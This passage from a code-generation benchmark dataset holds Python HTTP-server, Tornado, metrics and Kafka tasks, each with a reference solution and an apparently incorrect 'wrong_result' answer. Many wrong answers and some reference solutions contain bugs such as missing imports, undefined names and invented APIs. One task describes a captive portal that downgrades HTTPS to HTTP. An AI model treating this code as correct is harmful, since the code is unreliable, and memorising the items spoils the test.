    "Instruction": "Task Description: Implement a Python HTTP server using the http.server module to handle GET and POST requests, track request counts, and manage server lifecycle.\n\nClass Description: The implementation consists of two classes: RequestHandler (for handling HTTP requests) and HTTPServerManager (for server management).\n\nAttributes:\n\nhits: ClassVar[dict[str, int]] - Class-level dictionary to track counts of different HTTP methods received\nport: int - The port number on which the server will listen (in HTTPServerManager)\nserver: HTTPServer - The HTTP server instance (in HTTPServerManager)\n\nMethods:\n\nRequestHandler:\nlog_message: (format: str, *args: Any) -> None - Overrides default logging to also output request body data when present\ndo_POST: () -> None - Handles POST requests, increments POST counter, and sends 200 response\ndo_GET: () -> None - Handles GET requests, increments GET counter, sends 200 response with JSON content type\n\nHTTPServerManager:\n__init__: (port: int = 0) -> None - Initializes the server with specified port (0 for random port)\nserve_forever: () -> None - Starts the server to handle requests indefinitely\nshutdown: () -> None - Shuts down the server gracefully",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom collections import defaultdict\nfrom typing import ClassVar\nimport json\n\nclass RequestHandler(BaseHTTPRequestHandler):\n    hits: ClassVar[dict[str, int]] = defaultdict(int)\n\n    def log_message(self, format, *args) -> None:  # noqa: A002\n        super().log_message(format, *args)\n        if length := self.headers.get(\"Content-Length\"):\n            data = self.rfile.read(int(length)).decode(\"utf8\")\n            sys.stderr.write(f\"{data}\\n\")\n\n    def do_POST(self):  # noqa: N802\n        self.hits[\"POST\"] += 1\n        self.send_response(200)\n        super().end_headers()\n\n    def do_GET(self):  # noqa: N802\n        self.hits[\"GET\"] += 1\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(UPDATER_INFO_STR)\n\nclass HTTPServerManager:\n    def __init__(self, port: int = 0):\n        self.port = port\n        self.server = HTTPServer((\"localhost\", port), RequestHandler)\n\n    def serve_forever(self):\n        self.server.serve_forever()\n\n    def shutdown(self):\n        self.server.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport json\nfrom typing import Any, Dict, List, Tuple, TypeVar, Generic, Optional\nimport logging\n\nT = TypeVar('T')\n\nclass RequestHandler(http.server.BaseHTTPRequestHandler):\n    hits: ClassVar[Dict[str, int]] = {}\n\n    def log_message(self, format: str, *args: Any) -> None:\n        super().log_message(format, *args)\n        if self.rfile:\n            try:\n                body = self.rfile.read()\n                if body:\n                    self.log_message(f\"Request Body: {body.decode()}\")\n            except Exception as e:\n                pass\n\n    def do_GET(self):\n        RequestHandler.hits[\"GET\"] = RequestHandler.hits.get(\"GET\", 0) + 1\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(json.dumps({\"status\": \"success\", \"method\": \"GET\"}).encode())\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        RequestHandler.hits[\"POST\"] = RequestHandler.hits.get(\"POST\", 0) + 1\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(json.dumps({\"status\": \"success\", \"method\": \"POST\", \"data\": post_data.decode()}).encode())\n\n\nclass HTTPServerManager:\n    def __init__(self, port: int = 0):\n        self.port = port\n        self.server = socketserver.TCPServer((\"localhost\", self.port), RequestHandler)\n\n    def serve_forever(self) -> None:\n        self.server.serve_forever()\n\n    def shutdown(self) -> None:\n        self.server.shutdown()\n\n\nif __name__ == \"__main__\":\n    server = HTTPServerManager(port=8000)\n    server.serve_forever()\n```"
  },
  {
    "Task_id": 233,
    "Instruction": "Task Description: Create a Python HTTP server that handles POST requests, logs event headers and content, and responds with a JSON acknowledgment.\n\nClass Description: The implementation consists of two classes: MyServer (request handler) and HTTPServerWrapper (server management). MyServer processes incoming POST requests while HTTPServerWrapper manages server lifecycle.\n\nAttributes:\n\nhostName: str - The host address to bind the server to (default: '0.0.0.0')\nserverPort: int - The port number to listen on (default: 20888)\nwebServer: HTTPServer - The HTTP server instance\n\nMethods:\n\nMyServer.do_POST() -> None - Handles POST requests by:\n  1. Printing the 'X-Yunion-Event' header\n  2. Reading and printing the request body\n  3. Sending a 200 response with JSON {'result':'ok'}\n\nHTTPServerWrapper.__init__(hostName: str = '0.0.0.0', serverPort: int = 20888) -> None - Initializes the server with given host and port\nHTTPServerWrapper.serve() -> None - Starts the server and handles requests until keyboard interrupt, then cleans up",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass MyServer(BaseHTTPRequestHandler):\n    def do_POST(self):\n        print(\"event\", self.headers.get('X-Yunion-Event'))\n        contlenstr = self.headers.get('Content-Length')\n        contlen = 0\n        if contlenstr and len(contlenstr) > 0:\n            contlen = int(contlenstr)\n        print(self.rfile.read(contlen))\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(bytes('{\"result\":\"ok\"}', encoding='utf-8'))\n\nclass HTTPServerWrapper:\n    def __init__(self, hostName='0.0.0.0', serverPort=20888):\n        self.hostName = hostName\n        self.serverPort = serverPort\n        self.webServer = HTTPServer((self.hostName, self.serverPort), MyServer)\n\n    def serve(self):\n        print(\"Server started http://%s:%s\" % (self.hostName, self.serverPort))\n        try:\n            self.webServer.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        self.webServer.server_close()\n        print(\"Server stopped.\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\nimport json\nimport logging\n\nclass MyServer(http.server.BaseHTTPRequestHandler):\n    def do_POST(self):\n        # Print the 'X-Yunion-Event' header\n        event_header = self.headers.get('X-Yunion-Event', '')\n        print(f\"Received event header: {event_header}\")\n        \n        # Read and print the request body\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        print(f\"Request body: {post_data.decode()}\")\n        \n        # Send a 200 response with JSON acknowledgment\n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps({'result': 'ok'}).encode('utf-8'))\n\nclass HTTPServerWrapper:\n    def __init__(self, hostName='0.0.0.0', serverPort=20888):\n        self.hostName = hostName\n        self.serverPort = serverPort\n        self.webServer = socketserver.TCPServer((self.hostName, self.serverPort), MyServer)\n\n    def serve(self):\n        try:\n            print(f\"Starting server on {self.hostName}:{self.serverPort}\")\n            self.webServer.serve_forever()\n        except KeyboardInterrupt:\n            print(\"\\nKeyboard interrupt received, shutting down server\")\n            self.webServer.shutdown()"
  },
  {
    "Task_id": 234,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server for Bayesian optimization that can receive parameters and targets via POST requests, register them with a Bayesian optimization instance, and return suggested parameters for the next evaluation.\n\nClass Description: BayesianOptimizationHandler is a Tornado RequestHandler subclass that handles HTTP POST requests for Bayesian optimization. It maintains a BayesianOptimization instance and a UtilityFunction to suggest new parameters based on registered data points.\n\nAttributes:\n_bo: [BayesianOptimization] - Instance of BayesianOptimization configured with a black-box function and parameter bounds\n_uf: [UtilityFunction] - Utility function instance used for suggesting new parameters\n\nMethods:\npost: [post]() -> [None] - Handles HTTP POST requests. Expects JSON body with \"params\" and \"target\" fields to register with the optimizer. Returns suggested parameters as JSON. The method:\n1. Decodes the JSON request body\n2. Attempts to register the parameters and target with the optimizer\n3. Generates and returns new suggested parameters\n4. Writes the suggested parameters as JSON response\n\nThe class should be used as part of a Tornado web application that listens on a specified port for optimization requests.",
    "Canonical_solution": "import json\nimport tornado.ioloop\nimport tornado.httpserver\nfrom tornado.web import RequestHandler\nimport requests\n\nclass BayesianOptimizationHandler(RequestHandler):\n    \"\"\"Basic functionality for NLP handlers.\"\"\"\n    _bo = BayesianOptimization(\n        f=black_box_function,\n        pbounds={\"x\": (-4, 4), \"y\": (-3, 3)}\n    )\n    _uf = UtilityFunction(kind=\"ucb\", kappa=3, xi=1)\n\n    def post(self):\n        \"\"\"Deal with incoming requests.\"\"\"\n        body = tornado.escape.json_decode(self.request.body)\n\n        try:\n            self._bo.register(\n                params=body[\"params\"],\n                target=body[\"target\"],\n            )\n            print(\"BO has registered: {} points.\".format(len(self._bo.space)), end=\"\\n\\n\")\n        except KeyError:\n            pass\n        finally:\n            suggested_params = self._bo.suggest(self._uf)\n\n        self.write(json.dumps(suggested_params))\n\ndef run_optimization_app():\n    asyncio.set_event_loop(asyncio.new_event_loop())\n    handlers = [\n        (r\"/bayesian_optimization\", BayesianOptimizationHandler),\n    ]\n    server = tornado.httpserver.HTTPServer(\n        tornado.web.Application(handlers)\n    )\n    server.listen(9009)\n    tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "import tornado.web\nimport json\nfrom bayesian_optimization import BayesianOptimization\nfrom utility_function import UtilityFunction\n\nclass BayesianOptimizationHandler(tornado.web.RequestHandler):\n    def initialize(self, bo, uf):\n        self._bo = bo\n        self._uf = uf\n\n    def post(self):\n        try:\n            data = json.loads(self.request.body)\n            params = data.get(\"params\")\n            target = data.get(\"target\")\n\n            if not params or not target:\n                self.set_status(400)\n                self.write({\"error\": \"Missing 'params' or 'target' in request body\"})\n                return\n\n            self._bo.register(params, target)\n            suggested_params = self._uf.suggest(self._bo)\n            self.set_status(200)\n            self.write(json.dumps(suggested_params))\n        except Exception as e:\n            self.set_status(500)\n            self.write({\"error\": str(e)})"
  },
  {
    "Task_id": 235,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that serves coverage badge images based on project coverage data stored in files. The server should handle GET requests, read coverage data from files, and redirect to appropriate badge images based on coverage percentage.\n\nClass Description: CoverageBadgeServer is a Tornado web application that serves dynamic coverage badges. It initializes a web server that listens for requests and routes them to a handler that processes coverage data.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8888)\n- address: str - The IP address to bind the server to (default: '127.0.0.1')\n- application: tornado.web.Application - The Tornado web application instance\n\nMethods:\n- __init__(port: int = 8888, address: str = '127.0.0.1') -> None - Initializes the server with specified port and address, sets up URL routing\n- start() -> None - Starts the Tornado web server and begins listening for requests\n\nClass Description: MainHandler is a Tornado request handler that processes GET requests for coverage badges.\n\nMethods:\n- get(project: str) -> None - Handles GET requests:\n  - Input: project - The project name from the URL path\n  - Behavior:\n    1. Attempts to read coverage data from '/tmp/{project}-coverage' file\n    2. Determines badge color based on coverage percentage (\u226580% = green, <80% = yellow)\n    3. Redirects to appropriate shields.io badge URL\n    4. Returns 404 if coverage file not found\n  - Output: HTTP redirect to badge image or 404 error",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\nimport urllib\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self, project):\n        try:\n            with open('/tmp/%s-coverage' % project, 'rb') as f:\n                coverage = f.read().strip()\n                n = int(coverage.strip('%'))\n                if n >= 80:\n                    color = 'brightgreen'\n                else:\n                    color = 'yellow'\n                self.redirect(('https://img.shields.io/badge/'\n                               'coverage-%s-%s.svg'\n                               '?style=flat') %\n                              (urllib.quote(coverage), color))\n        except IOError:\n            raise tornado.web.HTTPError(404)\n\nclass CoverageBadgeServer:\n    def __init__(self, port=8888, address='127.0.0.1'):\n        self.port = port\n        self.address = address\n        self.application = tornado.web.Application([\n            (r\"/([a-zA-Z0-9\\-_]+)\", MainHandler),\n        ])\n\n    def start(self):\n        self.application.listen(self.port, address=self.address)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "import tornado.web\nimport tornado.ioloop\nimport os\n\nclass CoverageBadgeServer:\n    def __init__(self, port: int = 8888, address: str = '127.0.0.1'):\n        self.port = port\n        self.address = address\n        self.application = tornado.web.Application([\n            (r'/coverage/(.*)', MainHandler)\n        ])\n\n    def start(self):\n        self.application.listen(self.port, self.address)\n        tornado.ioloop.IOLoop.current().start()\n\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self, project):\n        coverage_file = f'/tmp/{project}-coverage'\n        if not os.path.exists(coverage_file):\n            self.set_status(404)\n            self.write(\"Coverage data not found\")\n            return\n\n        with open(coverage_file, 'r') as f:\n            coverage_percent = float(f.read().strip())\n\n        if coverage_percent >= 80:\n            badge_url = f'https://shields.io/badge/coverage-{coverage_percent:.1f}%-green'\n        else:\n            badge_url = f'https://shields.io/badge/coverage-{coverage_percent:.1f}%-yellow'\n\n        self.redirect(badge_url)"
  },
  {
    "Task_id": 238,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that can handle GET requests and respond with a simple text message.\n\nClass Description: The TornadoServer class encapsulates the functionality to create and run a Tornado web server with a single endpoint that responds to GET requests.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8000)\n- application: tornado.web.Application - The Tornado web application instance that manages request routing\n\nMethods:\n- __init__(port: int = 8000) -> None - Initializes the server with the specified port and sets up the application routes\n- start() -> None - Starts the server by binding it to the specified port and beginning the I/O loop",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\n\nclass TextHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, world!\")\n\nclass TornadoServer:\n    def __init__(self, port: int = 8000):\n        self.port = port\n        self.application = tornado.web.Application([(r\"/text\", TextHandler)])\n\n    def start(self):\n        self.application.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "class TornadoServer:\n    def __init__(self, port: int = 8000):\n        self.port = port\n        self.application = tornado.web.Application([\n            (r\"/\", self.handle_get)\n        ])\n\n    def handle_get(self, request):\n        request.write(\"Hello, world!\")\n        request.finish()\n\n    def start(self):\n        self.application.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a function to send metric data to the Librato metrics service using HTTP POST requests with basic authentication.\n\nFunction Description: The function `count` sends a counter metric to Librato's API. It establishes an HTTPS connection to the metrics API server, sends the metric data as a URL-encoded form, and includes basic authentication headers. The function handles the case where authentication credentials are not configured by doing nothing.\n\nInput:\n- `name` (str): The name of the counter metric to be sent\n- `value` (int, optional): The value to increment the counter by (defaults to 1)\n\nOutput: None (The function doesn't return any value, but sends data to the external metrics service)",
    "Canonical_solution": "from ConfigParser import NoOptionError, NoSectionError\nimport base64\nimport httplib\nimport urllib\nfrom blueprint import cfg\n\ntry:\n    token = cfg.get('librato', 'token')\n    username = cfg.get('librato', 'username')\n    auth = 'Basic {0}'.format(base64.b64encode('{0}:{1}'.format(username,\n                                                                token)))\nexcept (NoOptionError, NoSectionError):\n    auth = None\n\ndef count(name, value=1):\n    if auth is None:\n        return\n    conn = httplib.HTTPSConnection('metrics-api.librato.com')\n    conn.request('POST',\n                 '/v1/counters/{0}.json'.format(urllib.quote(name)),\n                 urllib.urlencode({'value': value}),\n                 {'Authorization': auth,\n                  'Content-Type': 'application/x-www-form-urlencoded'})\n    r = conn.getresponse()\n    conn.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\n\ndef count(name, value=1):\n    url = \"https://metrics.librato.com/v1/metrics\"\n    auth = (\"user\", \"password\")  # Replace with actual credentials if configured\n    headers = {\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        \"Authorization\": \"Basic \" + base64.b64encode(f\"{auth[0]}:{auth[1]}\").decode(\"utf-8\")\n    }\n    data = {\n        \"metric\": name,\n        \"value\": value\n    }\n    try:\n        response = requests.post(url, headers=headers, data=data, timeout=10)\n        response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        pass"
  },
  {
    "Task_id": 240,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the Tornado framework to handle backend requests and serve static content, with support for both HTTP and HTTPS connections.\n\nClass Description: The HTTPServer class initializes and runs a Tornado-based web server that can handle backend API requests and serve static files, with separate configurations for HTTP and HTTPS ports.\n\nAttributes:\n- ip: str - The IP address to bind the server to\n- port: int - The HTTP port number to listen on\n- ssl_port: int - The HTTPS port number to listen on\n- template: object - An object providing template paths for static content\n- em: object - An event manager object providing backend functionality\n\nMethods:\n- __init__(ip: str, port: int, ssl_port: int, template: object, em: object) -> None - Initializes the server with configuration parameters\n- run() -> None - Starts the HTTP and HTTPS servers and begins the I/O loop\n\nAdditional Class Descriptions:\n\nBackendHandler (extends tornado.web.RequestHandler):\n- Purpose: Handles POST requests to the backend API endpoint\nAttributes:\n- em: object - Event manager object providing backend methods\nMethods:\n- initialize(em: object) -> None - Initializes the handler with the event manager\n- post() -> None - Processes POST requests, executes backend methods, and returns JSON responses\n\nCaptivePortalHandler (mentioned but not shown in reference):\n- Purpose: Handles requests to the captive portal (implementation not shown)\n\nDowngradeToHTTP (mentioned but not shown in reference):\n- Purpose: Handles HTTPS requests by downgrading them to HTTP (implementation not shown)",
    "Canonical_solution": "import tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\nimport json\nfrom tornado.escape import json_decode, url_unescape\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em):\n        self.em = em\n\n    def post(self):\n        json_obj = json_decode(self.request.body)\n        response_to_send = {}\n        backend_methods = self.em.get_backend_funcs()\n        \n        for func_name in list(json_obj.keys()):\n            if func_name in backend_methods:\n                callback = getattr(backend_methods[func_name], func_name)\n                response_to_send[func_name] = callback(json_obj[func_name])\n            else:\n                response_to_send[func_name] = \"NotFound\"\n\n        self.write(json.dumps(response_to_send))\n\nclass HTTPServer:\n    def __init__(self, ip, port, ssl_port, template, em):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n    def run(self):\n        app = tornado.web.Application(\n            [\n                (r\"/backend/.*\", BackendHandler, {\"em\": self.em}),\n                (r\"/.*\", CaptivePortalHandler),\n            ],\n            template_path=self.template.get_path(),\n            static_path=self.template.get_path_static(),\n            compiled_template_cache=False,\n            ui_methods=uimethods)\n        app.listen(self.port, address=self.ip)\n\n        ssl_app = tornado.web.Application([(r\"/.*\", DowngradeToHTTP)], port=self.port)\n        https_server = tornado.httpserver.HTTPServer(\n            ssl_app,\n            ssl_options={\n                \"certfile\": constants.PEM,\n                \"keyfile\": constants.PEM,\n            })\n        https_server.listen(self.ssl_port, address=self.ip)\n\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "import tornado.ioloop\nimport tornado.web\nimport ssl\n\nclass HTTPServer:\n    def __init__(self, ip: str, port: int, ssl_port: int, template: object, em: object):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n        self.application = tornado.web.Application([\n            (r\"/api\", BackendHandler),\n            (r\"/static/(.*)\", tornado.web.StaticFileHandler, {\"path\": template}),\n            (r\".*\", tornado.web.StaticFileHandler, {\"path\": template}),\n        ])\n        self.application.em = em\n\n    def run(self):\n        http_server = tornado.httpserver.HTTPServer(self.application)\n        http_server.listen(self.port, self.ip)\n        https_server = tornado.httpserver.HTTPServer(self.application, ssl_options={\n            \"certfile\": \"path/to/cert.pem\",\n            \"keyfile\": \"path/to/key.pem\"\n        })\n        https_server.listen(self.ssl_port, self.ip)\n        tornado.ioloop.IOLoop.current().start()\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em: object):\n        self.em = em\n\n    def post(self):\n        data = self.request.body.decode()\n        result = self.em.process_data(data)\n        self.set_status(200)\n        self.write({\"result\": result})\n\n# Example usage:\n# server = HTTPServer(\"0.0.0.0\", 8888, 443, \"static\", some_event_manager)\n# server.run()"
  },
  {
    "Task_id": 241,
    "Instruction": "Task Description: Create a threaded HTTP server using the Tornado framework that echoes JSON responses for GET and POST requests, allowing for concurrent operation and graceful shutdown.\n\nClass Description: JSONEchoServer is a threaded HTTP server implementation that runs a Tornado web application to handle JSON echo requests. It provides methods to start, stop, and check the server status.\n\nAttributes:\n- lock: threading.Lock - A synchronization primitive used to coordinate server startup\n- port: int - The TCP port number on which the server will listen\n- _stop: threading.Event - An event flag used to control server shutdown\n- daemon: bool - Thread daemon flag indicating whether the thread should exit when the main program exits\n\nMethods:\n- __init__(lock, port, *args, **kw) -> None - Initializes the server thread with a lock and port number\n- stop() -> None - Signals the server to stop by setting the stop event\n- stopped() -> bool - Returns True if the server has been signaled to stop\n- setup_application() -> tornado.web.Application - Creates and returns the Tornado web application with configured routes\n- run() -> None - Main thread execution method that starts the Tornado I/O loop and web server",
    "Canonical_solution": "import os\nimport json\nimport socket\nimport threading\nimport tornado.ioloop\nimport tornado.web\nfrom functools import wraps\n\nclass JSONEchoHandler(tornado.web.RequestHandler):\n    def get(self, matched):\n        payload = dict([(x, self.get_argument(x)) for x in self.request.arguments])\n        self.write(json.dumps({matched or 'index': payload}, indent=4))\n\n    def post(self, matched):\n        payload = dict(self.request.arguments)\n        self.write(json.dumps({\n            matched or 'index': payload,\n            'req_body': self.request.body.decode('utf-8'),\n            'req_headers': dict(self.request.headers.items()),\n        }, indent=4))\n\nclass JSONEchoServer(threading.Thread):\n    def __init__(self, lock, port, *args, **kw):\n        self.lock = lock\n        self.port = int(port)\n        self._stop = threading.Event()\n        super(JSONEchoServer, self).__init__(*args, **kw)\n        self.daemon = True\n\n    def stop(self):\n        self._stop.set()\n\n    def stopped(self):\n        return self._stop.isSet()\n\n    def setup_application(self):\n        return tornado.web.Application([\n            (r\"/(.*)\", JSONEchoHandler),\n        ])\n\n    def run(self):\n        loop = tornado.ioloop.IOLoop()\n        application = self.setup_application()\n        application.listen(self.port)\n        self.lock.release()\n        loop.start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "import tornado.ioloop\nimport tornado.web\nimport threading\nimport json\nimport time\n\nclass JSONEchoServer:\n    def __init__(self, lock, port, *args, **kw):\n        self.lock = lock\n        self.port = port\n        self._stop = threading.Event()\n        self.daemon = kw.get('daemon', False)\n\n    def stop(self):\n        self._stop.set()\n\n    def stopped(self):\n        return self._stop.is_set()\n\n    def setup_application(self):\n        def handle_get(request):\n            return tornado.web.Finish(json.dumps({\"method\": \"GET\", \"path\": request.path}))\n\n        def handle_post(request):\n            body = json.loads(request.body)\n            return tornado.web.Finish(json.dumps({\"method\": \"POST\", \"path\": request.path, \"data\": body}))\n\n        return tornado.web.Application([\n            (r\"/\", handle_get),\n            (r\"/post\", handle_post)\n        ])\n\n    def run(self):\n        app = self.setup_application()\n        http_server = tornado.httpserver.HTTPServer(app)\n        http_server.listen(self.port)\n        try:\n            while not self._stop.is_set():\n                tornado.ioloop.IOLoop.current().process_forever()\n        except KeyboardInterrupt:\n            pass\n        finally:\n            http_server.stop()\n            tornado.ioloop.IOLoop.current().close_all()\n\ndef main():\n    lock = threading.Lock()\n    server = JSONEchoServer(lock, 8888)\n    thread = threading.Thread(target=server.run, daemon=server.daemon)\n    thread.start()\n\nif __name__ == \"__main__\":\n    main()"
  },
  {
    "Task_id": 242,
    "Instruction": "Task Description: Create a Tornado-based HTTP server class that can handle incoming HTTP requests and respond appropriately. The server should be configurable to run on a specified port and include a basic request handler for demonstration purposes.\n\nClass Description: The TornadoHTTPServer class encapsulates the functionality to create and run a Tornado web server. It initializes the server with a default port (configurable), sets up request handlers, and provides a method to start the server.\n\nAttributes:\n\napp: [tornado.web.Application] - The Tornado web application instance that manages request handlers and routing.\nhttp_server: [tornado.httpserver.HTTPServer] - The HTTP server instance that will listen for incoming requests.\n\nMethods:\n\n__init__: [Name](port: int = 8000) -> None - Initializes the TornadoHTTPServer instance. Sets up the application with a default route handler and prepares the HTTP server.\nInput Parameters:\n  - port: int (default=8000) - The port number on which the server will listen.\nReturn Value: None\n\nrun: [Name]() -> None - Starts the HTTP server on the specified port and begins the I/O loop to handle incoming requests.\nInput Parameters: None\nReturn Value: None",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        greeting = self.get_argument('greeting', 'Hello')\n        self.write(greeting + ', welcome you to read: www.itdiffer.com')\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.app = tornado.web.Application(handlers=[(r\"/\", IndexHandler)])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self):\n        self.http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "import tornado.web\nimport tornado.httpserver\n\nclass TornadoHTTPServer:\n    def __init__(self, port: int = 8000):\n        self.app = tornado.web.Application([\n            (r\"/\", SelfHandler),\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n        self.http_server.listen(port)\n\n    def run(self):\n        tornado.ioloop.IOLoop.current().start()\n\n\nclass SelfHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, world!\")"
  },
  {
    "Task_id": 246,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server that handles GET requests and responds with a customizable greeting message.\n\nClass Description: The TornadoHTTPServer class encapsulates the functionality to create and run a Tornado web server that listens on a specified port and handles HTTP requests.\n\nAttributes:\n- port: int - The port number on which the HTTP server will listen (default: 8000)\n- app: tornado.web.Application - The Tornado web application instance that routes requests to handlers\n- http_server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application\n\nMethods:\n- __init__(port: int = 8000) -> None - Initializes the HTTP server with the specified port (default: 8000)\n- run() -> None - Starts the HTTP server on the specified port and begins the I/O loop\n\nAdditional Class (Request Handler):\n- IndexHandler: tornado.web.RequestHandler - Handles HTTP GET requests to the root URL (\"/\")\n  Methods:\n  - get() -> None - Processes GET requests, optionally takes a 'greeting' query parameter, and returns a response combining the greeting with a welcome message",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        greeting = self.get_argument('greeting', 'Helloi World')\n        self.write(greeting + '\\nwelcome you to read: www.itdiffer.com')\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        self.port = port\n        self.app = tornado.web.Application(handlers=[(r\"/\", IndexHandler)])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self):\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "import tornado.ioloop\nimport tornado.web\n\nclass TornadoHTTPServer:\n    def __init__(self, port: int = 8000):\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/\", IndexHandler)\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        greeting = self.get_query_argument('greeting', default=\"Hello\")\n        self.write(f\"{greeting}, welcome to the server!\")\n\ndef main():\n    server = TornadoHTTPServer()\n    server.http_server.listen(server.port)\n    tornado.ioloop.IOLoop.current().start()\n\nif __name__ == \"__main__\":\n    main()"
  },
  {
    "Task_id": 254,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a CSV file and sends it as JSON messages to a specified Kafka topic, with proper resource management and message delivery guarantees.\n\nFunction Description: The function reads movie rating data from a CSV file, converts each record into a JSON message, and publishes these messages to a designated Kafka topic. It includes a 30-second initial delay (to ensure Kafka broker availability), configures the producer with appropriate settings, sends messages with a small delay between them, and properly closes the producer after sending all messages. A special \"*COMMIT*\" message is sent as the final message to indicate completion.\n\nInput: None (The function uses a hardcoded CSV file path \"./dataset.csv\" and Kafka broker address \"kafka:9092\")\n\nOutput: None (The function's effect is the messages sent to the Kafka topic, not a direct return value)",
    "Canonical_solution": "import csv\nimport json\nimport time\nfrom kafka import KafkaProducer\n\ndef kafka_producer():\n    topic = \"ratings\"\n    time.sleep(30)\n    producer = KafkaProducer(\n        bootstrap_servers=[\"kafka:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=(0, 10, 2),\n    )\n\n    with open(\"./dataset.csv\", newline=\"\") as csvfile:\n        dataset_reader = csv.reader(csvfile, delimiter=\",\")\n        first_line = True\n        for row in dataset_reader:\n            if first_line:\n                first_line = False\n                continue\n            message_json = {\n                \"userId\": int(row[0]),\n                \"movieId\": int(row[1]),\n                \"rating\": float(row[2]),\n                \"timestamp\": int(row[3]),\n            }\n            producer.send(topic, (json.dumps(message_json)).encode(\"utf-8\"))\n            time.sleep(0.1)\n\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nfrom confluent_kafka import Producer\nimport csv\nimport time\nimport os\n\ndef send_movie_ratings_to_kafka():\n    # Hardcoded CSV file path and Kafka broker address\n    csv_file_path = \"./dataset.csv\"\n    kafka_broker = \"kafka:9092\"\n    topic = \"movie_ratings\"\n\n    # Initial delay to ensure Kafka broker is available\n    time.sleep(30)\n\n    # Configure the producer\n    producer = Producer({\n        'bootstrap.servers': kafka_broker,\n        'delivery.timeout.ms': 30000,\n        'message.timeout.ms': 30000\n    })\n\n    # Read the CSV file and send each record as a JSON message\n    with open(csv_file_path, 'r') as csvfile:\n        csv_reader = csv.DictReader(csvfile)\n        for row in csv_reader:\n            # Convert the row to a JSON string\n            json_message = '{\"%s\": \"%s\"}' % (row['title'], row['rating'])\n            producer.produce(topic, value=json_message)\n            # Small delay between messages\n            time.sleep(0.1)\n\n    # Send the COMMIT message to indicate completion\n    producer.produce(topic, value='{\"status\": \"COMMIT\"}')\n    producer.flush()\n    producer.close()\n\n# Call the function to start the process\nsend_movie_ratings_to_kafka()\n```"
  },
  {
